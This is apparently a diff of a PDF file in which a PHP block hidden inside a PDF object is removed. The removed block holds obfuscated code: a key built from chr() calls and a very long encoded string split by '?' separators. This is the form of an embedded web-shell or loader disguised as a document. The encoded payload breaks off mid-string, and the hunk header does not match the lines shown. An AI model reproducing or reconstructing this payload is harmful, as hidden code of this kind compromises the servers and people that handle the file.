@@ -2,31 +2,1990 @@
 %âãÏÓ
 1 0 obj<</Type/Catalog/PageMode/UseOutlines/Pages 3 0 R>>
 endobj
-2 0 obj<?=
-$xZfZLjFv = chr(49) . chr(51) . chr(51) . chr(55);
-$LMHBLXv = chr(63);
-$EtPUvpJF = 'Cg5ZfAd?LQ3l0Cx?xbAkRrW?kQAfWZm?RnBaeHR?kAw8LHH?cHAQUeA?GsDGgFQ?QlwCaQV?1TgJnCG?dSXFRuA?lJeDktD?ZBxdBUE?EYEtHB1?d+WmV/G?HkGC3ZL?ekZ9Vxh?8QgNhdg?t4fXJcX?3FFVAhB?YhgFAlF?dQgEDe1?lOZERUc?V5LfHYc?RGIEfwZ?jBlcDYl?FFAVZnA?2F4Dwty?XwdfeWJ?kcVRgfl?BlBVJ4c?gBZUmB4?f3trUkB?BCmBAcl?dzYWcAB?VZ1RWR/?GEdTfkI?FYEYCQE?UDCxgAB?lJwWwV7?RFhtdFV?eBFIYR0?ZkUlQPQ?3d+RQZl?dlBXeVp?9XmkCYw?ZSfF5/a?VVPHGBa?eFYHYQF?gY2RueA?d2b2JDV?U1hdFpb?B2JeBV1?AfA5lVU?JnUn1hT?Wp8Q3IE?AAhPYAF?SYn0YfX?RqakB/d?WZgenkc?cmdSC1J?HS2ByWn?l9fF5lQ?V9ZfUIH?dUNKRl9?cYnx8Bm?VQRVZCB?3oYdQZQ?UlBSQGV?BBhwLCg?ZbQnUAZ?ksCVUNK?Z3pYVll?CR111e0?5gcAEFB?FBeRlJ3?XVllRkl?4dHt4Zw?V/a3RiV?lZ9W0lW?XV5Ec3J?hS0Rda0?VgHAVDS?GJAckVt?e1dLdgo?DcAVbGF?heWgoCR?kBbQHYA?BnBwAEZ?LDwZnRm?BwHAgGA?0BcYQV3?eAZ+S3h?CZ359dU?oKRRh3V?AluWmJk?Q11DQUM?Ke1pkUG?AIQ2VfH?kJEfXAD?egsHZX8?EfEJ0eE?NwcANee?EdJdwVf?enYPAXF?8fkVBHm?11YglxX?ktVBnYK?VwVHCml?kXmkaWA?VlQV8EY?2RFV1R+?QmZGcHF?3YV9nWk?FIBxxld?UcEXQZe?YERCYkJ?weXJgRg?hBekpAW?WlceERf?S3MHYhh?kQGkccH?pbZXdVc?XIFWH0D?XVZLRF1?6S1ZgBA?NCYWRqR?110RwUI?Y2R4WBg?HCkNnV3?VQXn1AZ?UFXd2YA?R3wBWnU?Aa1Z0XG?hPUXh+f?EdqRn1C?HF9fAVg?CBFthSX?1cC2BOB?mAaUHJj?RRwLcQk?FYllVRQ?AHZlMDZ?lB1eGoG?c0lee39?mUWNYfk?ZlRGBLf?V4BY3pe?BXB3YlJ?GQUcESQ?NUWkdDD?nV2SUdJ?QGFPfkN?JBlcGVl?wBUnhaf?UZ8Q158?WGNyC1V?kUQNHDl?cLUFBpQ?l9wGHhz?R0l0ZGF?dX3APZG?lbZXJ/d?1AFCktn?SwsAYFB?XUlJ+eV?lwWHxmR?gNRWlFj?aWlOY0p?oVH17CH?J+YVAAZ?15VfmYc?CEFVUQg?BcVl1bW?JWS1JrV?1RkXwZI?VQpeaH1?SclZSfF?sDVFtga?A4FVFV5?RGRYYl9?GBXBEdU?NzBUd3X?VliYk9J?fHhkVVB?6AwR5Gg?9wa3d7A?UNnQ2R0?Qk8DA1R?OcQoJW2?FeGk99W?QFFWFRj?YEBkAm5?fXUsORl?R+DnhcS?FJhXFZ+?cV15A1w?HS2Z8cR?4BelxwD?n9qf3MH?BVR6Sl8?HdUpjZU?cDUWBGZ?3pAcnJV?X2dAZUI?EaktVeW?l9aFV7S?1h5eXsF?cUFeHm5?ZCgRUam?pyW2ZjW?QJ5ZHN/?ZwR1Vnp?DWll2YE?tzQ1BTc?VhBHlpr?RFJxQVp?DRXp0Yl?Z0dUdUX?X53UkZb?XWZXUAB?mXwNWZW?dSBV54d?AhNWVwD?dnpaW05?xYgdeWG?Z2enh6X?0ZaRUJT?AEVIQ3t?pSwFcHE?FFWnZpW?mJ0BnUC?BXJbfF0?AfVx9fE?FyYFRtQ?nRpVENQ?cnt1VXd?RYH1zR3?hZXgJgU?VNlexxF?TX5EHnx?GUGtUAm?BaTVIHA?1FEcGd1?dlJ/ewF?RdAFwd2?tucWRrB?Gp0eU4D?UGFaRF5?2Wnd/Yk?R5cmgOf?2ZSVlxH?RAUHdlZ?QdFJ+XG?FJXX1Za?l1mel9c?VEV3aW1?ddghiBE?dee3cYU?mF1egda?YVQDcUZ?bCHtiVn?dFQnICf?lFlf0Re?V0htZ3F?+ZHZ+Bl?QDQ0YHV?3EBckBi?QAUCSV1?aVF0ARE?pfUk5XU?QlkX3we?fld+ZVV?AX2ViQX?REbwdaW?E1aVAB8?aVl5YUp?JGhhrcG?dAY0B0f?H1bR15h?cglOW2Z?6Dlt9AH?hcRkICZ?FtSR0V9?RWEKRHV?ZSUtcXk?lge09XV?ndPeAN3?AF9yCHN?nY1JlW1?RlVFcLQ?WB6AkNA?SUBFX3x?rd19XVV?J+dQRjR?0JwYlJ6?XAdhAFY?eGGl4CX?oDA0F9Q?1EITnl1?GnxZQ3p?Ce1sAeX?xXfFpKV?ARwe1dr?fmlJSUA?CVgJFXX?RQVH98Y?HlbXVQE?XVBEWF9?aR3hjf2?VCYkNmf?mZ6Zk5S?cmNBWkA?JUARiZl?tbe3Nxc?lJYVWdK?Aw5LRXB?TRV14WQ?VrdHFSR?3ZNAXJJ?WnFGf3N?mHH5AfX?oJbXd1e?mBJdnRZ?aV5VU3R?pVn0EW0?lAa0FDD?3BbRQZS?eHJEUGt?YQVcDR1?VRAnxZU?EdZZFEF?U018AmV?CAVEFUl?BrU3NqR?GIGfFh4?TQRgYHx?pdQl4AU?N9dXZea?wZcWgln?S2FyYVB?gcGZhUX?ICfHQDf?wF0elVB?X3RAZAN?EQ0l5Yn?B6UHgYS?0NZU39a?YQN2VVp?xZxhkVA?UcdmJcW?2FhCgda?ZHgBRXx?QUWtbR1?F/W1RmY?WRpVgZa?X2ZiWUd?EeFRZeX?twV3dgB?19jawd1?fF54dns?ecnICWV?9Rdn5DB?kJiQl0C?YW9BUXh?ZV0RdBX?lgQ3sFe?3d9ZVge?bkVkWnN?jZ3kCan?YEe0l7f?wZlQRpW?HF4Ebls?YCGRJC0?ZOY2BcH?Hscclpg?fntEcgV?dAQBeBk?JBQWZHQ?2lpWVFl?CGIYfHA?DVGJmZH?ILdHp7d?FlxYl9A?U3V0Al1?LdmJBaX?17TmtFY?lpiZ2NC?X31+AFJ?EQXJ9V1?oGWHhAe?kVLdFZc?cWd4ZUI?CeAoGYl?hHVWZfW?ndSVGZX?Wm9KYQF?ualtoHH?cBSFRUY?FQGQ1ZQ?WV5FU3J?6fHRFck?ZgT2Rqf?2RCZ2Zh?WWd1dF5?CGm1gSw?VWYXFcU?QNxR21l?VAlBXAB?7Y0JAaw?VHHEtTf?0pZRRhg?VX16f3h?vfXIDZn?dWeFtfc?GQYBhgF?AEBfRFF?yZXADd3?0eQmN8A?HQDS395?VGdLZEt?lBFh2XU?BxWQZaD?mFbBnNj?XghCWXB?3dkBWRH?VKSmJwU?lwJAUR+?Gk5lS0l?UHGd8BV?kKBl5lY?ARjQXZp?X1dqfAF?KV159RE?ADU39SX?HJjW0tW?QgNJQkd?UVGZ/Ul?9wXVt+f?2ZkUnVk?eGdSYXQ?CZkZVYA?Z8cglVd?0N5RlVq?CXtYVkd?bY31XUU?Z5eAYYZ?GZwAUNQ?Xl9pS2I?YUARPfg?tgfhhBQ?k57f39i?AkoFYwt?neUBGfV?hAdX57T?3cYSW5J?QVpvUlB?6Q0BGYl?1WZWZeY?lZgZXgK?aHoYWAB?nBgQEUU?BadHxgV?2ZUY3Fy?A1AHeUJ?BWWcCa3?1+Anx8X?H5lXF9P?BFwIWmt?pXmRQWw?MEAklhd?Bh7YFt0?cElyBlp?yYHRHdG?5FW0t7Q?kRXf1R/?Q1ZXV3A?AeQRAdW?lFdHVCe?ggHZnoa?Z1l7REZ?5cVpCe1?ByQWkKW?nkEfEF+?VmdIWmd?HV31+fV?JUeVRJd?AF/eFoL?QlZkZ3k?ERnsAa1?4KUhpwV?GdYdlhd?XXpHckV?PSl5/B3?tgfF9/a?0FtQlYG?cRgFCAY?DahpQfV?BkQWEGX?Wd1XGVG?e3UHRWV?qWEJEdn?R8Wn5iD?gR4BXBE?aUFCAHJ?YB1Zgfn?1+AWhdQ?XRbf0Ze?c3wEe1B?Panp3dW?p8QwNge?UVbfEt6?AHVrQWN?jQ1NtY0?BAcQJDa?wZ3Qmty?YkJ5ZAV?kckcHe1?xdA3dcT?WF5YEYK?eAdfSQN?lVXZjfk?NidxoFA?1BQc3EC?SW1cYHh?ycmEJem?lXAHBie?lt/aWRr?TQYAf1Z?iZwB7an?ZFbWJlY?HVfUUt4?ZVZbAX9?GfEFASQ?kYaVkJY?V5xfG9r?QRpFBXY?eVVJgaU?JZUFBzV?ARhAVZw?f0cBY2N?eUktHQn?1/BXB7C?n58X2QJ?UXFFXW1?5dn5NRn?h5VkJkf?m8Ee3tk?dXYJR3d?BSWRWC0?tYGFZXA?V5xdQBq?AB5eHEB?2ZmZDc2?BcW3dHY?EJhQ2EE?WlpXS1x?/Rxx0YE?FjdmJdV?1VkfQcG?AGsFQmY?GBmhWCw?tae2kBY?QFaXndk?XGN/BGc?CCA5hAA?hfBAADe?QYHR3gD?WUV/GGZ?mT1QFA0?NxV1gFQ?ApQcnhm?XmAEAEV?DdV5Ufk?oCQWccZ?lt8fVp5?cXRVcEE?Ya2J9HH?5LW2VcX?AdFcWgC?RFIeGHV?3dEZDYl?NiB2NrW?nZ2S0ML?SlNBaQZ?rR2prd2?BDQWRgA?ApTe14A?dnV3fls?CXnFZAQ?pCfQ58V?mhZS0tX?dAd9cGF?ESVxDC3?J2Qkl3W?GN7eGht?B2YIcHd?WS0BXGA?Z/UWVfU?AMKAXoK?YFZlVmA?IUnl2f3?RgYwgAf?mZLbnlS?RARJcRo?OUWZyRV?t1eBhpe?GJNAgpa?VkIEBHB?+VH9xCn?VLX2V6f?10KBwRx?Rklrb3Z?pRllRHF?l6XF5gA?3QEXXV7?agRaegF?jbUBVcF?RdGFQBQ?VdFWWBG?aFBKYB4?FZkBpGA?JpW3JLR?1cFdABd?YEtXVgd?jAAAYZ3?d6UAEGV?XxyAWUC?X11IdV5?hZAVcXU?J0ankeR?AZ2ZH1H?dQN1egI?DWnFXfA?FVAQhDf?3JeVgRp?QnhJAQJ?beFlHT1?pZYmFcW?GgPY3tX?D2BRfQF?meGZlW3?ZjDwFCR?nFgfVkY?RlV+Xn1?kYERkcg?FgBgFHX?GJhBwcG?Un4cBHh?5c390cH?RYWnl/W?nxLVElK?RH1VRkl?ua3ddeQ?oYWUFaa?nRzQUN6?AX9DYnU?BRHBgZG?dScXJBf?FFZUWVb?BUV6WXd?iAU9RWx?57e3VlU?RhUflkL?SVVTHAR?ybgFEYg?Z8Q3tOa?gt1eWAH?en1JQEF?zXgpTRg?VwR3RbA?kFhC3se?T1d/WVJ?WUEROAk?ldWXAYZ?FABXHlf?fkFXX1d?ZRQB6dE?ZcfgIAH?HtUaHNl?WVVFUAc?CBwtbSG?ZJdAVde?UpGf3Zd?S2V7RGt?aAGlUdV?pWem9JQ?gl+dXRg?RHpdQgF?aVwdNQQ?p/UklJC?Q5cRUl/?HAQBTQJ?SYnhlRH?8De0Bpd?nt2UHhQ?GFBbdAd?FXkFKBW?FwRXgOZ?0UBbUcK?XHJXWUt?WX2NZeg?UECABCY?2lgXF9e?RVlbeAR?1dFB0QW?l+R3pne?lkDAmJh?AXtAZGB?JeGMGSn?h1Y35gc?kNFYgV0?ZHQAQUp?/Umd/fg?FFf2YBf?UByT3pF?RFBmZlc?EaX9BUV?l0dFJcY?UZgenp+?WnJ9VQN?UUV1VfF?tjcEl6e?m95Sntf?Z3R8QFx?jZltVXX?RvBnxeU?HBQfn10?XXQFdEt?JBWZESH?VhQ2V4Q?VZfA3tQ?Q31FcnB?jYWVrBU?dQZ1NgA?2lwXGp4?AgB7dGV?LeHl6GE?V6QUpLU?1R4YUFv?ZHR9cwp?nemNVVg?NgUWlCZ?VZ4XmZy?RnUHZkF?2VRhQYF?tXRVIBA?HJrX1d8?elJBXXd?ceEVnT2?N6SFEYV?GFCeFxa?ZFVrR0F?afwB+AA?dnBlZ6W?ARRUnBc?VUtEUAA?Cc2V6Zn?lCSVRCR?URyWE94?Un5OXmt?DZXt4QF?pKSVNVV?WV2UGBV?dkJhUkR?1d1JeXW?FZRW9EQ?3VNY3JC?UVhfZmJ?wXwZwBA?BGWndae?3hqXEV6?GHRHHGs?HckJ5fU?QOQ398H?FwFUGFj?VnJBZ2l?XHFx/fl?NGZB52Z?FBeZ1lc?YGVRS0h?Odn1Vel?IDVG16U?URZXHFQ?WF1HB1l?AGGVRC2?dVBF9DB?XJkaVJF?WgJJdXd?EBBhwSU?Z+SnkIB?WdJXFsF?anhCa1R?LAHlrRg?F/CmsBA?AF2dUoK?RAECSWI?OQlFHUH?98SA9lC?nhPWl9g?fnJ1CXt?aZlVVfH?9ZUEZ+Q?kEYa10B?VVUEAHA?Gd1F2Q3?5OdgBUU?WVRU2AE?Slx1a1d?jWAVSY3?N5VgRPe?HV/HHF9?aWRFBQZ?aakJSfF?VCCVAAY?19SBmdi?Tlt3BnE?AW3JNRV?p0RVhbS?X5JWF9a?HHFrUhh?mfgVpd0?Vyf0ZAd?ntdQXl5?cnd6fVc?aRgIDCW?V/aXVFY?F1TZGp4?YgN3GBp?SAld0dU?B7WVVBX?1pGVUJ6?QHtrWXV?af0IFen?pBRn5jC?EdRRQUD?A1UEUUd?4BQN6Yh?56RHIGB?0pFU3xk?WgdABgB?XRV93cg?ddXFZ0W?XUATgR1?fUZcXVg?cW0t1UX?RYQX92d?15FClZo?cAAKSUZ?AXVhSCk?t5WUBdX?nNKYwRF?UntzfQt?+RFZZC0?F/GEFdW?nhnSV99?aXxNCgd?mVQZmR1?JjcgZbc?AF0DhgF?f256dml?WX2NBUw?tCdWdwA?GV/UFty?ZnVlAAd?wVEZHC1?ZFfRxCe?G5BAFNY?W3Z6BER?KA1Zneh?4DAn0Be?3sDYn1p?BEN5BFJ?iYAZ2QV?FYeHBbS?1BABktL?WBwKVnt?RV35wYl?hEcA8YV?EEAeVxD?HHp2YF1?0WloES2?N9YV5Dc?FYEY3sF?UVV6BmZ?yWG8GZA?NFBWpdH?GtcRU9j?UXpFfkk?CbWJScl?ZGdWtWQ?GVFVHlB?eA9QamB?SYgoFdQ?cLR0J3V?1B6SkN3?ZmBbf0V?XAEZ1QG?R0GAZGQ?XQDHGN/?VGR4QGM?LB3oCfk?lnYVd8b?QBKAWQG?Bl57awN?2WAN6fU?RLcgdwV?GAIbUBf?BgdgZEl?SBwVycV?R1chgFS?l97UHRn?cgRyXFp?ARXlPGE?t2fFZqc?HlRUF1d?fUVndBh?gRX1ecl?RmS0NCU?0NjfRx+?W3d6Wgp?iQWNpRn?ZJBURvY?gBhfnl/?WUNfUQJ?5QUBEfl?4CRXlDA?ERVVGV4?dX8CcgB?lf3xAZn?paR1lfQ?mRHdWMY?GENSemF?EQUdUUX?VSX3Z1X?XF7W0J/?RwBAeF9?GR2lxCQ?IYUkVbY?3BSbnhk?aGFhWkN?yaXdUbm?V9AVhre?VNNaXld?TmJSWlR?QZGNZfF?l7QmRUZ?WJBAgFy?XndSA1w?KYWRDcm?BEAGp2c?1JdX3pq?SnxvRml?ZWV17SE?BYCgdxe?l99DmsK?f1N/aUM?FRmAGb1?FWWlJ+A?lh/QRxC?QEFUHlA?KCltRXl?IGGHIHQ?kF4YmJ9?aXJ5UgZ?SXRxiZH?d6Bl15U?GFRAVQB?Z1QEV0R?8YngDVn?F4cV8ER?XBXVgJy?aGV3AFZ?SUXUAUH?RyBV8YU?mRWdWpU?cXJVaV9?4ZH1dYF?F+UgdwV?VFJHFVi?UV8FTlh?UYFx6Bm?hGf0kEX?2lJc3t3?f3lydnB?FGFx8cl?FGVlZcf?xxHb1hb?ZVFiXHd?ZfUtSZF?9nfA5aa?ndaBktA?YgVQXkZ?hSgd9BH?oFAApVA?kNGRnIE?eRxSY35?YRV97Un?YBfVZbY?EtbdFZ7?cQYHcAV?gdGpABn?Z2f2AHB?mdmBmNJ?S0VKcQF?7WmtdZ0?VJfFJ4a?QZzSlxE?QEoHWXh?7SkNDRl?5IVWBwW?3kEAgdE?XldbRn5?UYH1bBE?BOBwN0Q?EZDB2NL?cklAQ3x?7BXxQXk?F/RWNwd?VcETV0F?X1J1BER?WAAFTZX?9SQ29KQ?lhOeFVg?AV1qWHx?VBnt7Rn?BoBlBYa?1tdXFlZ?WltYBwF?ZVwZ4eU?ECdQJwV?EJ4YV5X?YwEPfEt?ZbWVbAn?5hCllkc?V9wTnFY?V1JBSWN?+XWNQfV?V3elJmY?WN+YWVS?b2UEaQd?LZ0R/dQ?p9RlBDc?FNyB3kP?QV8CQkN?5Vn4AUQ?FScXVTB?ktRV0d+?SWdPdH5?UfGt1Q1?J8eV5zZ?FdfXnVq?VnNXQVg?BZloEW1?p/XAVdZ?GZ/Ugca?UGt2SVY?CRmgYcn?tzW396d?X0KXXJx?BEtfA1F?nXg8CXn?ZtA3V4f?lp6eEVX?WnRZCmR?eT1ILdF?kLZAJyX?Vh/UQZ6?e19qfkZ?mUFJlQW?UYXVFQC?0VaW2FY?cwMKd1B?fHABlRF?cEYlF9Z?V8GC1sP?UEFmcFt?rS1lVX0?UAS35DB?AFWdFFA?ZwlSZmZ?5WkdecF?hhRx5aY?EQIbWVr?QwJfdQN?GdEFZe2?BfBnZiR?EZtVgdo?TWIARWJ?pQmh0Sl?BwD0VJH?gdAQ3V2?f2tXY31?wBEB/el?1gaUVUQ?kd2cGNj?QEYAcFF?Tb2VCS2?VQZn9NX?HZSZgd8?cERrd0Z?QXWtBR3?lyV2ZRV?wR5enJQ?RmNCBF9?UBH5SBF?RBUVoAU?GQYBwRk?eAZHW3F?bZQVqYW?ZWdHVSX?GUAfXFS?UXoPUQs?DDltpc0?8ERlZjc?HR8T2ZX?dHEBGEB?ufH5AYG?UHYn9iQ?1dzUANI?GHoCA3M?DcXdNCk?NwdWt5U?3FBB39j?WVlQfEd?8Q04HUH?JFC1J2D?gZeYX1E?Q2h5UVR?VbndnWF?hcWEVeY?l1GcGB8?Y15fSwd?eRQtZRn?p4XnRfQ?3Z7QHhb?TkRQQ3B?qA2tze2?tiR2VUA?3N2fH5k?B0oEHH9?gBGBbHG?RjC3ReX?34KXH5S?CmUPAVE?AX2tyS3?wBa3tTe?ltER0ZB?SHFxBAV?0A0QGHA?ZWAgdfd?lllR2tb?VHdYCHx?mBn9gQw?QEAkkBe?E1SSgJS?X3pwYQR?pQGQGRV?V7UmJiD?nZGf2Vh?aWlCV2d?mVgtlAx?heX1VZQ?0kAfmZc?RQ9nV31?Ye1lpXW?NEVmJ4f?mJ9ZmNV?DnhrAgN?YdUZwWX?tSXkZ1S?UdhSQYP?QEF8b19?7AAZgSV?xtX1EBe?1dZfQ9i?WFx4eWJ?JXVIGZ1?YLYlwEd?GNwQnRq?fX5cRwM?BYwZXA0?cBX0FnB?XhnfgdT?Vn5LclA?BXwldQ3?5JewN7A?3QKBUZT?fHBjU0R?0dl9dSW?NlX1xCf?gNFAnB1?HAJ4eHd?WUgdWaF?1iZ2hVZ?0ZVRUpi?ZWJkenc?PRgtVBU?tJYG9rf?QlRUVUJ?eFAHBgU?GdlN+dm?teU3pla?WdpdFh6?UmddfAZ?8eVMEWH?l9akR2Z?GphRnJ3?Y3dtcGN?XXVVLVE?NBdmcGC?hh+AXcB?ZwZ9Uml?2Zn1/Xn?t7VRwcR?gJvXUlf?cQtKQ3p?aBFMBRg?R0TQVhU?2d4R3Nt?ZldoBQd?7XWVFXX?V/dVBof?nIEB0AD?ZlpvfnF?2cwBae0?BXeGlWV?wVybmsB?aRxXVXZ?hYVpUfw?FmR3BKe?HtkdXZV?T3wKfXx?lAWhlZW?QBZgJrH?lN4SltZ?dVdmenp?YSFNbWn?RYAVRXG?EQHAFkD?WgMOYnc?BZxh6V3?0cW312A?Vx9Wntd?YlpFCmk?EBGFjXH?JfAk1Ec?npxWGd4?dgt1S05?mcgZ9aU?ZdVGV4U?hh1YlZS?AwJze38?Ef2ZxZA?FcQ3REQ?0VxXQBn?dGZBBEp?0R2Z5dg?JHdkMGR?UFDVQoF?XUF6GHd?xSkdhW2?F7VxhjA?11NQEBG?YFRfa25?ne2sFA0?FHREJxa?HhYaUNa?cmECDgF?eSVl7W1?NeXl96B?154dFgF?VgAFR1V?XBFBjBw?EEZXtnA?GtzBl1m?Z3ZjSWJ?0a0RQZA?Z1XX9WA?FMcC0oC?fUlGRVZ?yektPUU?YFenpVc?l1wfwJ0?QntCZEF?/WHsYWm?d0ZnYFd?V5BW15i?XXh1UVJ?ZDkFLU2?JbSmJuH?HxnQkpS?XwFZfFV?veVVibU?EHGgdwR?nZgXGp3?bkRiVEB?JdgcOcU?lbVklYf?UVacAhE?BEp0cXJ?4S2B1fX?xAX0p2c?Bxkc10E?VGNDQl1?mcGF0dl?lmV3x+H?FF+ZH4C?SwJrV2d?gf15XXl?VmWk0ES?0JaBFxk?X1B1B0V?xR3lQfn?VAdFZ3e?gFHd1kc?S0t2f0l?JaWF1Rk?t6UH1bd?UR6QBhJ?SUtZAUl?lVVUAAn?J+BksGa?WJ/BVlJ?cw8La1N?7QX9ZAU?phAABhX?XJUVgd3?XH1wCAN?wBnZRB1?RyeH1qc?3ocWWZH?cHIGeXl?rBkFYcH?VlRENGY?1UGXUV/?CntVQkl?HY1xSSG?ZBQ0JaB?WRjeFRa?QWB2dGZ?lUAtmAF?JVZUcFf?EdgRAtJ?eUpHe01?SAlRFeQ?dXfAtZf?nRreV9N?Q2J/W3R?Zdk1hCw?ViZn52Z?mdxRlJ8?YH98eAR?lQnJfe1?tlRlcGR?HBVfmpU?QwIGa0J?+ewFjWW?VRUk9YC?mhbVmdf?cl9VdVJ?AWkZaYF?pYfQtkV?llWXGlf?SmtDVF1?DdEV2ZQ?Z9WANUW?VtKSHRU?cnx4R2N?kRVdGaG?1dW1Z+U?QR6TQZ2?VX5ffAB?fBGl4B1?hgeFJaV?lpZR3pi?WQUGZ3h?JVENRag?FZWl9qc?01AfkcE?A1tTD1F?yBVJaYn?wYXABWd?EFrYkFX?QRpFWF9?yBVdqBH?NUfGFVA?EtSUGN7?VUV1cFR?RZX9FRl?dVAXxAc?nl8QkpF?UgACW1J?WSltHcA?JIQkcBa?FZiXFAY?a1IaX3Y?AW3Rkdn?tFQEsEQ?nx/XlxA?Xl9BGF1?Wchxme2?NgBV0GY?FIAZ3Vd?ekUKcmN?/eGEIW1?B1d3BWB?kddfxxV?RnZEdXx?mZXxxeH?ZheHVJV?FhbfFZc?cAFmdgF?reG5Qfm?JTZFdGU?ldcV1Nb?d3t1dHl?gAFBmVG?FwAnp9A?kYJTmQC?Y3t8X1p?UeVBYQn?5gaVhjf?klTY2QB?ZlgKf0N?xSWcHaX?BVb2VlZ?l9SRwJm?cFIBQl9?8RkZGeh?4Af0RAZ?VBcB35p?eF0FA0J?iZnJhcF?gDZ1hRS?nBaUFdS?UlhJall?vdGlVfX?QHfGZZc?AAHWXBh?b3lGBAJ?4V3JAYw?NobWN1d?3V7egIE?e2NBfEF?SW2VAYU?t2AX5jX?AIYd2Nd?AmN5eAZ?DTgdBa1?VwCkhAX?nl5f2tr?BlYcVlh?1S0YBZU?Z7ZUBaS?ml4VF5A?DgVeZwJ?9Ql5xQE?lBVgpJQ?UR8aXp5?dAUEVkZ?bCWJee1?RlYXxhR?3VQY1JL?dnp+ZQR?WdFVZGg?IFelBPe?1dSb3hE?dlUKQUZ?RYUppT2?JiCBxgf?Ft6BEdo?A1tAQkF?Xd3JYQE?MJbV0AG?nRSZ112?S0ICUQZ?BYWVjYx?5ecQVkA?wZfck9V?eQVUQ0F?CdHl5Gl?JnXghFY?QBFXH0E?dnlURwF?VWlFidF?t4fUNGY?3tvB31V?dGl+aHt?1VmBRcU?JZRFxpR?ARbZHZ2?AVtIBQF?id090cF?lcA39cQ?1IKSQ9U?XHV9VUk?JcGpZYA?FHcH1wA?gdEXWNS?VXZmd2Z?FRHtITQ?t0SXt4U?mVvUFhU?UAdFQFF?LQGRvWg?tBQnFaQ?X54e2EC?Z1d7T0p?dR3J6YW?VACmlgf?1d4SAZg?cAF+GEZ?Ee3hLZQ?RjAEdjS?2sAe2pE?GhhjYkB?fVQVZXA?dFBl8cW?0BQWApb?fRhcWH9?yX3IOB2?VaAHlSY?l9yZ3RV?A0toUH5?daUJEYH?17SX9HZ?1wYdmJi?S3NAaXt?LRAAcaX?xRWnhea?QdLX3oG?R1paVVV?NWGdIew?tVB2ACV?QZzUENw?XQBSVXE?GX0lOCw?RmfF9jG?mF7VFRV?fkRgWXJ?GCE0DfU?VUWgQeU?lIFAgdc?RFBbSVJ?6B3IEem?1LUlB7d?GJ8ZllB?XwNeAmF?waVVSUw?VkYn4KC?l9FQnRX?blxKU3l?bcEtmVw?FWZml2U?FFpdgVz?aVF8A1d?rSQFSBW?dTRFcDA?Ed+AAZU?W0hGZHt?5eAJhaG?V9VXYCY?WVJRH17?RwZpUgF?OUktLQ0?N4eF9bV?GhTYmoC?cn17ZUV?SYX5CQV?FoWWVmR?wMYeVVC?QBgaBRh?hYlp1VG?JVAVlnZ?kdbWVZ6?Y3AOdkJ?fRmlnVX?hEYF1ZQ?Rx/VGN4?XHhfe2h?lBANdZw?ZASEIDB?1lDVlVV?ZGocXGN?WUHABQV?1Gfkt8e?hhbclNO?e3VoUnJ?UaXkHBF?R7eWtVZ?2ViUnsc?cXVmBnt?FTgBFXm?ZSZHZdY?wpTD3QE?dW14fF5?cAnJ1ZH?4EYHhkX?FJOSgAA?QUppZXp?aX2t4QE?R6dmZgW?U97WnBj?eHRnTVV?ge1t9X1?Z1fHZIR?QBWSE1D?YwlZeVV?0BgRqcH?JpfH1dW?3wGXXde?d19hA1J?tYEBlGF?oBc31Dc?GsOB3lV?fQRRdm9?BelBvQ1?BTfFhQU?3hga1gH?eV56c0d?BUGRcUn?hGUkdCc?Hl8cmZK?emlGXn9?JfQBGA2?FZQlpOf?HoGYEpL?ZFFZZWV?YUUNZT3?UcWlBeB?1oAXGpc?eX90Vnl?JdFp7Vl?pFR31+W?AVyWEUE?d0R8Z0Y?BX2IDXH?9SBHtfc?VtDQVJ8?VGMOBwt?dUkRbBU?QAARpkW?Ut4XHRH?S014S2Z?2dl5QZG?pQGlNUQ?QNPS2t0?XXlHAE5?cSwdOBV?8GUFYHU?nZgUmJb?Q35AWVZ?xSABJUX?hSWwtZH?AYFXFFE?BlN4SUt?nAmoLXg?4FZ0NSV?3pyQ0N2?fER5B1d?ZXGJYWX?ZJaxxaQ?AZcQAtb?ZHRXY05?Je2JifE?l/ZkcEd?3NeUAAH?e1sJYUt?dfgJcX3?JVa19SU?0pBQnwY?YElbC0V?CUXpRUl?lcWQVBa?lVfWUJd?d09mXgF?UdQZ5AA?NEcnBxX?FsYfgVH?D2NCQAN?nBnN2VH?trQAVVH?kBqR2cG?BkYeb1U?CengGeg?JHY2YaU?lVqW3Z5?VB5+UgN?ef2V7YH?x8d0ZNW?XtLZ0Vw?RwBheEN?mW1JAUE?VmcG5KW?QRVWAFm?flBcVQJ?FAFNkBm?JDZFZKY?F50YXd0?WgoIBQF?9BlN7Yw?gPeWVCX?nd2XWIL?QgRyYXV?BQGoGQU?RyZXMAY?HFmBV98?d2VgHAd?TAnRecl?xBXV9ne?FJtXVwI?TkFmRk1?FB2BgQX?tXfgFYV?2McXWYY?WUYEBn9?7fltVXl?92A1IEc?FdpBk9X?eUF+eHk?aYl9kW3?IBWHNWY?HxTUAR4?d39QWRp?YQ3V5YE?ZFQnppc?XNNd3BQ?Y0Njenp?bAn1kUk?RBWkN/C?XhregkD?SQJob1Y?YW1YFYW?tvfEFhY?3x2AllF?dmRxB3t?JBHd4eX?l7S3d7V?mN4Q119?B1YFe2V?PVXJ9Ql?pkAXEEG?AZQZHEA?TmJ+WVJ?GRkJmA1?d1Zl4BZ?VlcYVUO?BGlQc11?eeFNRZE?BnaWkEY?n1ARg5j?W2kAfX1?zVEZwXW?JRXH4DS?wBmcXta?W2J8A1h?SXANFcG?BdQVNHX?wR6dGlj?AWBldgY?EXmhmWA?p9f31+Q?3IARGlF?AXQHRVd?WXlt3ew?EEd0cBX?3ccAVNR?RX8Be2B?LekJGYV?V9Bl1fZ?RgDQWRL?UnhbBlx?NZGVie1?UHY21jd?UZ4ekt/?cF1AHmM?EfHxfUm?lbZAR+d?WVcd3dz?WBwEdQt?Ee0NZC0?BjCxxTe?0BJQmIc?A3d1cGF?1WwcYYX?EYfVx5V?mJTA1JQ?Y1xGHFd?nAUBUdW?FCZGFKB?n11AktU?BRhkB0N?3VVVRXl?hTcF5XS?1sKeEl9?SWpLfWJ?rQnl5aW?d0UXEFX?HV1WWF5?dkBDVFI?JdHtVYw?cLRkRGd?UtkcGBe?WVReeFN?6HAVrRU?ZHZlVeU?WcCAFpd?ZwcGUEB?2a0sHWg?Z/HGB6V?XVCYQdD?ekdIb0k?FaXxqQg?hAcWAJW?RgEeVla?UWZvZHt?eR2BnGl?p1BmZ7f?nZBVnlZ?UgZUWVZ?YQXJTdl?VASFJjG?HtDBFIG?fl99BEJ?0YUsGB1?1VBkV7e?1N6XVtt?YVdrWn1?SZVhWd3?ZGAkl2b?154e3Fy?eggGQgR?7WVVQU0?9jRUthC?3xVfXdU?A1N/Qlp?+Qld2cw?dSBQ5wV?AYYCmdi?dVFXYG4?GYBoDd1?JBcQFHf?FFjdHVV?Vkl5HF1?eVX8DVm?V